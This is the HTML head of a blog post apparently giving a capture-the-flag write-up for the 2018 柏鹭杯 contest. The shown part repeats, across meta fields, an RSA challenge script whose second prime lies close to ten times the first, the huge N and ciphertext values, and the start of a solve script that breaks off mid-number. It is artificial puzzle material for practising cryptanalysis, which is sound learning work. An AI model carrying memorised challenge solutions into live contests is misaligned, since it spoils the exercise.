<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>2018 柏鹭杯 writeup | 闲言语</title><meta name=keywords content><meta name=description content="CTF Crypto Crypto1 problem 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from flag import flag from Crypto.Util.number import * import random def next_prime(n): num = n + 1 while True: if isPrime(num): return num num += 1 p = random.randint(1<<3071,1<<3072) p = next_prime(p) q = next_prime(p*10) N = p*q e = 65537 c = pow(bytes_to_long(flag),e,N) print N#247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159 print c#152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628 solve 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 n=247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159 c=152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628 import gmpy2 from Crypto."><meta name=author content><link rel=canonical href=https://ret2neo.cn/post/181125-bailucup-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.42b1e004fb78db2fc933d33c9db659598f62453f0de6f9db50c85e5936c0d8c3.css integrity="sha256-QrHgBPt42y/JM9M8nbZZWY9iRT8N5vnbUMheWTbA2MM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://ret2neo.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ret2neo.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ret2neo.cn/favicon-32x32.png><link rel=apple-touch-icon href=https://ret2neo.cn/apple-touch-icon.png><link rel=mask-icon href=https://ret2neo.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="2018 柏鹭杯 writeup"><meta property="og:description" content="CTF Crypto Crypto1 problem 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from flag import flag from Crypto.Util.number import * import random def next_prime(n): num = n + 1 while True: if isPrime(num): return num num += 1 p = random.randint(1<<3071,1<<3072) p = next_prime(p) q = next_prime(p*10) N = p*q e = 65537 c = pow(bytes_to_long(flag),e,N) print N#247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159 print c#152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628 solve 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 n=247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159 c=152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628 import gmpy2 from Crypto."><meta property="og:type" content="article"><meta property="og:url" content="https://ret2neo.cn/post/181125-bailucup-writeup/"><meta property="article:section" content="post"><meta property="article:published_time" content="2018-11-25T20:25:37+08:00"><meta property="article:modified_time" content="2018-11-25T20:25:37+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="2018 柏鹭杯 writeup"><meta name=twitter:description content="CTF Crypto Crypto1 problem 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from flag import flag from Crypto.Util.number import * import random def next_prime(n): num = n + 1 while True: if isPrime(num): return num num += 1 p = random.randint(1<<3071,1<<3072) p = next_prime(p) q = next_prime(p*10) N = p*q e = 65537 c = pow(bytes_to_long(flag),e,N) print N#247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159 print c#152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628 solve 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 n=247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159 c=152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628 import gmpy2 from Crypto."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ret2neo.cn/post/"},{"@type":"ListItem","position":2,"name":"2018 柏鹭杯 writeup","item":"https://ret2neo.cn/post/181125-bailucup-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"2018 柏鹭杯 writeup","name":"2018 柏鹭杯 writeup","description":"CTF Crypto Crypto1 problem 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from flag import flag from Crypto.Util.number import * import random def next_prime(n): num = n + 1 while True: if isPrime(num): return num num += 1 p = random.randint(1\u0026lt;\u0026lt;3071,1\u0026lt;\u0026lt;3072) p = next_prime(p) q = next_prime(p*10) N = p*q e = 65537 c = pow(bytes_to_long(flag),e,N) print N#247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159 print c#152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628 solve 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 n=247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159 c=152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628 import gmpy2 from Crypto.","keywords":[],"articleBody":"CTF Crypto Crypto1 problem 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from flag import flag from Crypto.Util.number import * import random def next_prime(n): num = n + 1 while True: if isPrime(num): return num num += 1 p = random.randint(1\u003c\u003c3071,1\u003c\u003c3072) p = next_prime(p) q = next_prime(p*10) N = p*q e = 65537 c = pow(bytes_to_long(flag),e,N) print N#247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159 print c#152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628 solve 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 n=247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159 c=152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901